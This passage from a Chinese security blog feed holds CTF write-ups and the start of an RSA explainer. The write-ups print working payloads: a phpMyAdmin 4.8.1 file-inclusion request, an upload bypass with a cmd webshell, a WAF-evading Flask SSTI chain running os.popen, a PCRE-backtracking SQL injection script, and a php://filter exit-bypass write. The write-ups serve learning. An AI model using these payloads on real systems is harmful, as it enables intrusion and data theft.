AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Cookie: flag&#x3D;1</span><br></pre></td></tr></table></figure><p>通过覆盖<code>$_POST</code>与<code>$_GET</code>绕来两个死亡exit，通过最终的输出那道flag。</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917162459730.png" alt="image-20200917162459730.png"></p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>从题目猜出应该是与数据库有关的题目，通过扫描工具扫描得出：<code>phpinfo.php</code>与phpmyadmin目录。</p><p>访问phpmyadmin，访问直接已经登录好了。在首页处得到phpmyadmin版本：4.8.1。</p><p>通过phpinfo可以得到网站运行目录：/var/www/html</p><p>尝试直接写出文件，查看secure_file_priv权限，如果为’’则可以写入文件，为NULL则无权限。</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917212432455.png" alt="image-20200917212432455"></p><p>再尝试修改日志路径拿shell</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917212708785.png" alt="image-20200917212708785"></p><p>报错，提示权限不足。</p><p>打开搜索引擎，搜索phpmyadmin 4.8.1之后找到一个phpmyadmin的包含漏洞，详细分析地址：<a href="https://xz.aliyun.com/t/2399">phpmyadmin4.8.1后台GetShell</a>。</p><p>用图中的payload直接读取FLAG：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917212941931.png" alt="image-20200917212941931"></p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>这题和上边那题MRCTF2020的上传题是一样的，都是上传.httaccess文件后再上传一个jpg文件即可。</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917214214206.png" alt="image-20200917214214206"></p><p>注意，这里做了文件头和php内容判断，用GIF89a和<code>&lt;script language=&#39;php&#39;&gt;php代码&lt;/script&gt;</code>。</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917214314739.png" alt="image-20200917214314739"></p><p>读取根目录的FLAG：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;upload&#x2F;0cffff4b7b760870553f87db86cc9953&#x2F;2.jpg?cmd&#x3D;highlight_file(%27&#x2F;flag%27);</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200917214402402.png" alt="image-20200917214402402"></p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020重庆市教育系统网络安全攻防竞赛决赛 - Web Writeup</title>
      <link href="2020/2020%E9%87%8D%E5%BA%86%E5%B8%82%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20-%20Web%20Writeup/"/>
      <url>2020/2020%E9%87%8D%E5%BA%86%E5%B8%82%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20-%20Web%20Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚参加完比赛，趁还热乎这，就简(shui)单(pian)记(bo)录(ke)一下解题过程吧。逃(</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>web共有4题，能力有限，只做出了3题。</p><h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>题目告诉了web框架是flask，故开题直接老规矩，寻找SSTI。而考点重灾区，404页面肯定是第一时间要尝试的。</p><a id="more"></a><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915164358.png" alt="20200915164358"></p><p>寻找404页面：</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915164416.png" alt="20200915164416"></p><p>发现页面会将地址信息填充到页面内，直接<code>{{ 7*7 }}</code>尝试，如果返回49则代表此处极有可能存在SSTI漏洞。</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915164447.png" alt="20200915164447"></p><p>BINGO。接下来尝试从基类寻找危险函数了。</p><p>在此过程中发现题目存在WAF，对于存在下划线<code>_</code>与点号<code>.</code>的URL会被WAF拦截。</p><p>对于下划线我们可以通过请求代换给他去掉，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;&#123;&#123; &quot;&quot;[request[&quot;values&quot;][&quot;class&quot;]] &#125;&#125;</span><br><span class="line"></span><br><span class="line">class&#x3D;__class__</span><br></pre></td></tr></table></figure><p>上述payload在flask环境下相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;&#123;&#123; &quot;&quot;.__class__ &#125;&#125;</span><br></pre></td></tr></table></figure><p>寻找可用的类（通过Burp的Intruder爆破）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;%7B%7B&#39;&#39;[request[&quot;values&quot;][&quot;class&quot;]][request[&quot;values&quot;][&quot;mro&quot;]][request[&quot;values&quot;][&quot;subclass&quot;]]()[§§][request[&quot;values&quot;][&quot;init&quot;]][request[&quot;values&quot;][&quot;globals&quot;]][request[&quot;values&quot;][&quot;builtins&quot;]]%7D%7D HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x:10009</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">class&#x3D;__class__&amp;mro&#x3D;__base__&amp;subclass&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;builtins&#x3D;__builtins__</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915164450.png" alt="20200915164450"></p><p>450为无效数据，在有效数据内随意找一个含有eval的类来执行代码：</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915162210.png" alt="20200915162210"></p><p>读取利用eval函数列目录然后读取FLAG即可。</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915165521.png" alt="20200915165521"></p><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;%7B%7B&#39;&#39;[request[&quot;values&quot;][&quot;class&quot;]][request[&quot;values&quot;][&quot;mro&quot;]][request[&quot;values&quot;][&quot;subclass&quot;]]()[41][request[&quot;values&quot;][&quot;init&quot;]][request[&quot;values&quot;][&quot;globals&quot;]][request[&quot;values&quot;][&quot;builtins&quot;]][&#39;eval&#39;](request[&quot;values&quot;][&quot;a&quot;]%2b&quot;import&quot;%2brequest[&quot;values&quot;][&quot;a&quot;]%2b&#39;(&quot;os&quot;)&#39;+request[&quot;values&quot;][&quot;b&quot;]+&quot;popen(&#39;cat &#x2F;flag&#39;)&quot;+request[&quot;values&quot;][&quot;b&quot;]+&#39;read()&#39;)%7D%7D HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x:10009</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 117</span><br><span class="line"></span><br><span class="line">class&#x3D;__class__&amp;mro&#x3D;__base__&amp;subclass&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;builtins&#x3D;__builtins__&amp;a&#x3D;__&amp;b&#x3D;.</span><br></pre></td></tr></table></figure><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>这题侥幸拿了个一血，考点是PHP正则回溯漏洞。</p><p>打开题目链接，随意点了两下，发现一个可疑的URL，疑似是文件包含的功能，尝试LFI读取一下。</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915164730.png" alt="20200915164730"></p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915164837.png" alt="20200915164837"></p><p>另一边direarch的结果也出来了：</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915164858.png" alt="20200915164858"></p><p>结合本次题目标题，猜测考点为sql注入，我们先读取一下sql.php文件，看下后端的SQL代码是如何拼接的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;sql</span><br></pre></td></tr></table></figure><p>得到sql.php源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT|\/\*.*\*\/|sleep|and|if|&amp;&amp;|\|\||\^|%|ascii|mid|left|greatest|least|substr|=|-|&lt;|&gt;|benchmark|like|in|between|regexp/is&#x27;</span>, <span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from `ctf` where id =&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_row(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;./img/1.png&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$id</span>==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;img src=&#x27;./img/2.jpg&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$id</span>==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;img src=&#x27;./img/3.jpg&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;what do you do?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  &lt;p class=\&quot;lead\&quot;&gt;   </span></span><br><span class="line"><span class="string"><span class="subst">&#123;$row[1]&#125;</span>     </span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=\&quot;lead\&quot;&gt;   </span></span><br><span class="line"><span class="string"><span class="subst">&#123;$row[2]&#125;</span>     </span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">     &quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>老实说，看到第一个正则判断就知道是考PHP正则回溯了，之前有碰到过相关的题。</p><p>故我们编写脚本，使用脚本帮助我们添加100w个垃圾数据，EXP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author: yunen</span></span><br><span class="line"><span class="comment"># blog: www.0x002.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://x.x.x.x:10004/sql.php&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;5&#x27; union/*&quot;</span> + payload + <span class="string">&#x27;*/select 1,2,group_concat(flag) from flag#&#x27;</span>&#125;</span><br><span class="line">r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915165016.png" alt="20200915165016"></p><h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>这题挺有意思的，前前后后花费了好几个小时，最终才在比赛结束前半个小时弄出来。</p><p>打开题目得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getKey</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$path</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="variable">$expire</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = getKey(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$value</span>);</span><br><span class="line">    <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">    <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到关键点在与：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>而第一句是不是有些眼熟？没错，这是EIS 2019 EZPOP其中的一个考点之一，并且后续也有几个题目模仿了此题，可以说是老熟悉的题了。</p><p>但是此题的关键再于<code>$filename</code>与<code>$data</code>序列化前的内容相同。</p><p>对于<code>sprintf(&#39;%012d&#39;, $expire)</code>来说，会返回12位的数字字符串，接着与<code>exit()</code>拼接上形成一段php代码。</p><p>由于<code>exit()</code>的存在，使得正常情况下程序不会执行到<code>exit()</code>之后的内容。所以如何跳出死亡exit成为了关键所在。</p><p>这里我们采用LFI来控制file_put_contents写入的内容，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expire&#x3D;0&amp;path&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)&#x2F;resource&#x3D;s1mple</span><br></pre></td></tr></table></figure><p>其中<code>convert.iconv.UCS-4LE.UCS-4BE</code>过滤器会将伪协议加载的字节流进行可以进行usc-4编码转化，从而使得原本的死亡exit代码块面目全非，php解析器自然是无法识别的。而我们自行构造的字节流也能拼接上去，经过编码转换后成为新的php代码。这段说得有点笼统，具体的详情请移步至这位大佬的文章：<a href="https://xz.aliyun.com/t/8163#toc-12">file_put_content和死亡·杂糅代码之缘</a>。</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915165158.png" alt="20200915165158"></p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915165144.png" alt="20200915165144"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次比赛题目质量还行，虽说对于大佬来说可能就是洒洒水的级别，但总的来说还算有所收获的，学到了一些东西，也感受到了自己不足的一些方向。对于web2的sql那题来说，能拿一血就是对我平常习惯写文章来记录所学内容的一种肯定，如果当初自己没写那篇总结，估计也那不到一血。XD</p><p>最后放一张弟弟队的成绩图，前几名的大佬都tql，orz。</p><p><img src="https://img.0x002.com/article/ChongQingCTF2020/20200915161241.png" alt="20200915161241"></p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对RSA加密原理及其应用的简单研究</title>
      <link href="2020/%E5%AF%B9RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E7%9A%84%E7%AE%80%E5%8D%95%E7%A0%94%E7%A9%B6/"/>
      <url>2020/%E5%AF%B9RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E7%9A%84%E7%AE%80%E5%8D%95%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又是打CTF遇到的考点，也不是啥新鲜玩意了，这东西属于密码学的范畴，不过却是学信安的同学必须掌握的内容。今天就来打算好好学学这RSA究竟是个怎样的东西，让CTF考了这么多遍至今仍是一道频率极高的考点。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我们都知道，对于数字届来说，质数无遗是一种十分特殊的存在。他不会被除了1和他自身之外的正整数给整除，即他的因子只有1和他自己。而以目前的计算机算力来说，对于一个由两个1024位长的质数相乘得到的整数，想要反求他是由哪两个质数相乘而来实在困难重重。根据这一特性，RSA加密算法应运而生。</p><h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><p>想要弄清楚RSA加密原理，就不得不提到一位数学家——欧拉。</p><a id="more"></a><p>这里主要围绕他最经典的欧拉定理来展开</p><p>欧拉定理（n为正整数，a为非零整数）：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908223414176.png" alt="image-20200908223414176"></p><p>推论1，若m，n为互斥的正整数，则如下式子成立：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908223630798.png" alt="image-20200908223630798"></p><p>推论2：设存在整数a,b满足如下定义：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908224005384.png" alt="image-20200908224005384"></p><p>故ab相乘得到：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908224148997.png" alt="image-20200908224148997"></p><p>可推出：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908224321011.png" alt="image-20200908224321011"></p><p>又因为：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908224500068.png" alt="image-20200908224500068"></p><p>故：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908224823445.png" alt="image-20200908224823445"></p><p>且由于：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908224938453.png" alt="image-20200908224938453"></p><p>故得到：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908225033382.png" alt="image-20200908225033382"></p><h2 id="RSA过程"><a href="#RSA过程" class="headerlink" title="RSA过程"></a>RSA过程</h2><ol><li>选取两个质数<code>p</code>、<code>q</code></li><li>计算<code>n=q*p</code>（RSA密钥位数即为<code>n</code>的二进制表示位数）</li><li>根据公式<img src="https://img.0x002.com/article/rsa/image-20200908225726707.png" alt="image-20200908225726707">算出大于<code>0</code>小于<code>n</code>且与<code>n</code>互质的整数个数</li><li>选取一个正整数<code>e</code>且与<code>(p-1)*(q-1)</code>互质</li><li>由模反运算求出整数<code>d</code>：<img src="https://img.0x002.com/article/rsa/image-20200908230244190.png" alt="image-20200908230244190"></li></ol><p>此时我们的基本准备工作就做好了。</p><p>对于需要加密的明文<code>m</code>来说，可根据如下公式得到密文<code>c</code>：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908230523568.png" alt="image-20200908230523568"></p><p>而对于密文<code>c</code>来说，可根据下边的公式得到明文<code>m</code>：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908230624219.png" alt="image-20200908230624219"></p><h2 id="公式验证"><a href="#公式验证" class="headerlink" title="公式验证"></a>公式验证</h2><p>让我们来证明该方程组的正确性。</p><p>由上文的模反运算可得：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908231346509.png" alt="image-20200908231346509"></p><p>故而：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908231713855.png" alt="image-20200908231713855"></p><p>又因为：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908231936285.png" alt="image-20200908231936285"></p><p>所以：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908232120112.png" alt="image-20200908232120112"></p><p>综上所述：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908232228506.png" alt="image-20200908232228506"></p><p>又因为：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908232928816.png" alt="image-20200908232928816"></p><p>进而得到：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908233112434.png" alt="image-20200908233112434"></p><p>我们令：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908233241743.png" alt="image-20200908233241743"></p><p>则可得到：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908233313770.png" alt="image-20200908233313770"></p><p>等式方程组成立。</p><h2 id="安全性探讨"><a href="#安全性探讨" class="headerlink" title="安全性探讨"></a>安全性探讨</h2><p>在上述方程组中，<code>(n,e)</code>为公钥，<code>(n,d)</code>为私钥。公钥为公开状态，可供用户端进行加解密，私钥为私密状态，供服务端加解密。</p><p>对于流量嗅探来说，攻击者获取到受害者发送的流量，此时的数据在上述方程来说为<code>c</code>，除此之外攻击者还知道的值有：<code>n与e</code>。</p><p>对于式子<img src="https://img.0x002.com/article/rsa/image-20200908234349434.png" alt="image-20200908234349434">由于无法知道与余数<code>c</code>有关的商为多少，所以也无法得知<code>m^e</code>的值，故而无法求出<code>m</code>。</p><p>而对于式子<img src="https://img.0x002.com/article/rsa/image-20200908234513093.png" alt="image-20200908234513093">来说，私钥<code>d</code>是关键，如果<code>d</code>能被攻击者成功找到，那么数据<code>m</code>自然也是轻松算出。</p><p>私钥<code>d</code>是有模反运算得出的，由上文，我们知道：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908231346509.png" alt="image-20200908231346509"></p><p>其中<code>k</code>为任意正整数。若想得到私钥<code>d</code>，就得想办法算出<img src="https://img.0x002.com/article/rsa/image-20200908235018917.png" alt="image-20200908235018917">的值。</p><p>其中<code>n</code>在公钥内已给出，而剩下的内容就是计算。</p><p>若在已知<code>p</code>和<code>q</code>的前提下，由公式：</p><p><img src="https://img.0x002.com/article/rsa/image-20200908225726707.png" alt="image-20200908225726707"></p><p>可以很方便的计算出该值。</p><p>若在不知道<code>p</code>和<code>q</code>的前提下，则只能通过其定义进行计算与因数分解找出<code>p</code>和<code>q</code>两种办法，前者具体指的是找出大于0小于<code>n</code>且与<code>n</code><strong>互质</strong>的整数个数。</p><p>这两种方法以当前计算机的发展来看，在<code>n</code>极大且未有解的情况下，需要难以估计的计算机算力去花费很长时间运算才有可能计算出来，故而可以认为该值在不知道质数<code>p</code>和<code>q</code>值的情况下是不可能算出来的。</p><p>故而在不知道私钥<code>d</code>的情况下，可以认为数据<code>m</code>是安全的，无法被窃取与串改。</p><h2 id="RSA的应用"><a href="#RSA的应用" class="headerlink" title="RSA的应用"></a>RSA的应用</h2><h3 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h3><p>关于RSA的应用，我觉得SSL证书肯定是得讲讲的。简单的说，我们的操作系统内部内置由一些权威的CA证书机构的根证书(Root 